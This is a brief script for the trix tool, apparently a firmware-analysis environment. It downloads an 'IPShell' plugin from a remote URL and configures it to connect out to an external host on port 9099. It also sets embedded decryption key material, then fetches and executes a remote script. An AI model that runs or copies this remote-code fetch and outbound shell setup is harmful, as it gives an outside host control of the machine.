#include trix
#plugin "http://trix.g3gg0.de/plugins/get?IPShell"

int main ( )
{
	__options_set_bool ( "core.trixplug.skip_plugin_fail", 1 );
	__options_set_string ( "plugins.IPShell.remote", "lepton.lx-networking.de" );
	__options_set_int ( "plugins.IPShell.port", 9099 );
	__options_set_bool ( "plugins.IPShell.listen", 0 );
	__options_set_bool ( "plugins.IPShell.enabled", 1 );
	__options_set_string ( "core.fmt.trixcrypt.decrypt_key.key", "C0CA8F546E73F64B0D3D7368C87D1063B368E1EFE1DDBF2A45704B44C7BA216EAADE5A031C5E46FB1C1F698E93B8B627AC01098A75DAE948BB3B7E61207BCF3980E33FC0857548DB87F87717A746AA902ED8881E219041C028C8854C9F9BC857FB71B66062D0F343846016DBBE3DE6F87083D6829D16BDEDC3B1D9DEFC300D55" );
	__options_set_string ( "core.fmt.trixcrypt.decrypt_key.primefac", "00000001A9118BE1CBC2132B63DF26FA074EF9E353A36631B9C0902FDE6A9A555B6B4517BB1C90ADD41AAECBE9D2466997FCBA97ACBBFEC4152233E150881056117B9750B258DABE40F8EE002340D1CA27AF6BD1D12CC274981BD8B6791B86B62002B8CE80AE72EAC89011BF6B22C5B69E6894A0EA987060B67DB4C7464A347B1BF19FBEAFD4EBAC01FBC840BE8D99779C8E58F36E83E07299B0760C39D021C626081125AB86C1C0132E7FDFF001A284485030A3EC30C6012AD91699F24A5A61BA5105F6B02DC51B12741D5158BDBC91909214478BB3AD7F247D9B5EF646FCECFF554DF342D9EDD0DFD4DAD0324A23B6526146FCCFD2653F6D5E208744FC16935B5B6E81" );
	
	__netrix_execute ( "http://trix.g3gg0.de/main?type=ufs" );
}
